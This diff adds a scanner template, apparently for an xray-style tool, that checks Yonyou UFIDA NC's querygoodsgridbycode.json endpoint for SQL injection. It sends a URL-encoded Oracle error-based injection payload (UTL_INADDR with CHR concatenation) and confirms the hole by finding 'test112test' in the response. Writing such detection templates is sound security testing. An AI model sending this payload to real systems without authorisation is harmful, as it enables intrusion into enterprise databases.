@@ -1,0 +1,12 @@
+name: yonyou-UFIDA-NC-querygoodsgridbycode-sqli
+rules:
+  - method: GET
+    path: "/ecp/productonsale/querygoodsgridbycode.json?code=1%27%29+AND+9976%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28116%29%7C%7CCHR%28101%29%7C%7CCHR%28115%29%7C%7CCHR%28116%29%7C%7CCHR%2849%29%7C%7C%28SELECT+%28CASE+WHEN+%289976%3D9976%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%2850%29%7C%7CCHR%28116%29%7C%7CCHR%28101%29%7C%7CCHR%28115%29%7C%7CCHR%28116%29%29--+dpxi"
+    headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    expression: |
+      response.body.bcontains(b'test112test')
+detail:
+  author: fliggy
+  decrption: 用友大多数接口sql注入可以分为oracle和sqlserver，注意区别
